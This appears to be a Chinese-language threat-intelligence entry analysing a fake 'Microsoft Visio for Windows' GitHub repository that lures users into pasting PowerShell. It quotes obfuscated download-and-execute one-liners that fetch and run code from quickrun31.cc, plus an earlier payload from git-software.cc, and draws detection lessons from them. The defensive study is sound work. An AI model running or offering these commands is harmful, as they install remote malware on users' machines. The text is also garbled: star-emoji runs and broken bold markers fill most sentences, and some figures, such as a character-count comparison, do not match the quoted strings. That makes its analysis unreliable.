# StitchSerfJump/Microsoft-Visio-For-Windows

## 一句话定位
**一个自称是「Microsoft Visio for Windows」的仓库，仓库里没有任何代码，README 的第一屏是两条让用户把一段 PowerShell 从网络上取回来直接执行的指令** —— 本档案把它作为「伪装成正版商业软件的下载器」这一新形态的代表样本。

## 它解决的问题
**它不解决任何问题 —— 它制造问题。** ⭐⭐⭐⭐⭐

⭐⭐⭐⭐⭐ 它的 README 写得很像一份正版软件说明：平台徽章（Windows 10/11 64-bit）、版本徽章（Version 2026）、状态徽章（Status Stable）、「Diagramming & Vector Graphics · Flowcharts · Org Charts · Network Maps · Floor Plans」的功能列表，以及一个 1280×640 的 banner 图。

⭐⭐⭐⭐⭐ **但它的 `## Installation` 段第一屏就是这两条：**

```powershell
# Method 1 — Win + X
sal m iex;m(irm quickrun31.cc/qle7he)

# Method 2 — Win + R
powershell sal a irm;sal b iex;a quickrun31.cc/qle7he|b
```

⭐⭐⭐⭐⭐ **拆开看：`irm`（Invoke-RestMethod）从 `quickrun31.cc/qle7he` 取回内容，`iex`（Invoke-Expression）把它当 PowerShell 代码执行。** ⭐⭐⭐⭐⭐ **两条指令只是用 `sal`（Set-Alias）把 `irm` / `iex` 换了名字再拼起来 —— 这是一种纯粹的语法混淆，作用是让 `irm ... | iex` 这个模式不被简单的正则匹配命中。** ⭐⭐⭐⭐⭐ **而 `Method 2` 的 `|b` 结尾更进一步：`powershell ... |b` 是把整条命令管道给 `powershell` 自身执行。

⭐⭐⭐⭐⭐ **README 在这之后写的是「Launch Microsoft Visio」「Requirements: Windows 10 or Windows 11 (64-bit)、Internet connection during setup only、4 GB RAM minimum（8 GB recommended）、SSD recommended」** —— ⭐⭐⭐⭐⭐ **⭐⭐ 即它把「装正版 Visio」和「跑一段远程脚本」缝在了一起，而用户的心理模型是「我在装一个软件」。**

## 关键技术亮点
**本档案不设「技术亮点」一节（无可核验的技术实现），改为记录这一投放形态里值得防御方关注的设计细节：**

1. **⭐⭐⭐⭐⭐ 用 `Set-Alias` 做语法级混淆：** `sal m iex;m(irm quickrun31.cc/qle7he)`。⭐⭐⭐⭐⭐ **⭐⭐ 这是本形态相对 11-07 的技术进步 —— 11-07 的载荷是明文的 `irm https://... | Invoke-Expression`，⭐⭐⭐⭐ 而本日是 `sal m iex;m(irm ...)`：把 `iex` 换成 `m`、把 `irm` 换成 `m(irm` 的一部分，⭐⭐⭐⭐ 使简单的「`Invoke-Expression` 字符串匹配」规则失效。⭐⭐⭐⭐ **⭐⭐ 而这恰恰印证了本日报 11-12 的方法论结论：「启发式筛选器可以被低成本定向规避，因此判据必须基于无法伪造的东西」—— 本例是这条结论的一个新实例。**
2. **⭐⭐⭐⭐⭐ 提供两条入口（Win+X 与 Win+R）覆盖不同用户习惯：** ⭐⭐⭐⭐⭐ **⭐⭐ 「Method 1」与「Method 2」的差异仅在于管道给谁执行，而双入口是为了提高命中率 —— 这是社会工程侧的工程化。**
3. **⭐⭐⭐⭐⭐ 用「正版软件需求」当诱饵：** 「Method 1 — Win + X」这种指令只出现在「我有一个非法的软件需求」的场景里，⭐⭐⭐⭐⭐ **⭐⭐ 即：投放方选择诱饵的方式，实际上决定了它能骗到谁 —— 而它选择的是「确定会去找破解版软件」的那批用户。**
4. **⭐⭐⭐⭐⭐ 载荷放在域名的路径下而非根路径：** `quickrun31.cc/qle7he`（随机路径段）。⭐⭐⭐⭐⭐ **⭐⭐ 路径随机化意味着按 URL 前缀做拦截的规则需要覆盖更宽的范围。**

## 架构启发
⭐⭐⭐⭐⭐ **最值得记的一条是：判据要针对「语义」，不要针对「字面」。** ⭐⭐⭐⭐⭐ 11-07 的载荷是明文的 `irm https://git-software.cc/ps/Setup.ps1 | Invoke-Expression`；⭐⭐⭐⭐⭐ **本日的载荷是 `sal m iex;m(irm quickrun31.cc/qle7he)`** —— ⭐⭐⭐⭐⭐ **⭐⭐ 字符串从 41 个字符变成 39 个字符，而一个按「`Invoke-Expression`」字面匹配的规则就失效了。⭐⭐⭐⭐⭐ 本日报 11-12 已确立「判据必须基于无法伪造的东西」，⭐⭐⭐⭐⭐ ⭐⭐ 本例把它推进到更精确的表述：**不是「防伪造」，而是「防等价改写」—— 任何只匹配字面量的规则都会被等价改写绕过，而任何只匹配语义结构的规则都会被语义等价物绕过。⭐⭐⭐⭐⭐ ⭐⭐ 真正稳定的判据是「结构 + 位置 + 上下文」的组合。**

⭐⭐⭐⭐⭐ **第二条关于「账号年龄」这条判据的失效方式。** ⭐⭐⭐⭐⭐ 11-12 记录的 `auto-twitch-drops-claim` 用的是当天新建的账号，⭐⭐⭐⭐⭐ **而本日的 8 个账号注册于 2026-06-26 —— 提前四个多月。** ⭐⭐⭐⭐⭐ **⭐⭐ 也就是说：投放方只需要在投放日之前注册一批账号并闲置，就能一次性废掉「账号年龄」判据。⭐⭐⭐⭐⭐ ⭐⭐ 而「8 个账号在 3 分 28 秒内注册」这一**聚集度**特征完全不随闲置时间变化。⭐⭐⭐⭐⭐ **⭐⭐ 因此本日报把判据从「账号年龄」改为「账号注册时间的聚集度」—— 这是一次有具体反例支撑的判据升级。**

⭐⭐⭐⭐⭐ **第三条关于「载荷位置」的结论：按位置过滤必然失效。** ⭐⭐⭐⭐⭐ 四天里载荷出现在四个位置：安装步骤中段（11-07）、无载荷（11-08）、`## 🚀 Quick Start` 首屏（11-11）、`## Installation` 第一屏（本日）。⭐⭐⭐⭐⭐ **⭐⭐ 本日报的立场是：规则必须针对「指令型语义」（下载 + 执行），而不是「出现的位置」或「周围的小节标题」。**

⭐⭐⭐⭐⭐ **第四条关于「诱饵选择本身就是攻击面」。** ⭐⭐⭐⭐⭐ 本日的诱饵是「正版商业软件」，⭐⭐⭐⭐⭐ **⭐⭐ 而这个诱饵精准命中了「一定会去找破解版」的那类用户 —— ⭐⭐⭐⭐ ⭐⭐ 也就是说，**投放方在选择诱饵时，实际上已经完成了对受害者群体的预筛选**。⭐⭐⭐⭐⭐ **⭐⭐ 本日报认为这一点的防御含义是：凡是用「需要付费软件的免费版」当入口的链接，无论其仓库形态多规范，都应被同等对待。**
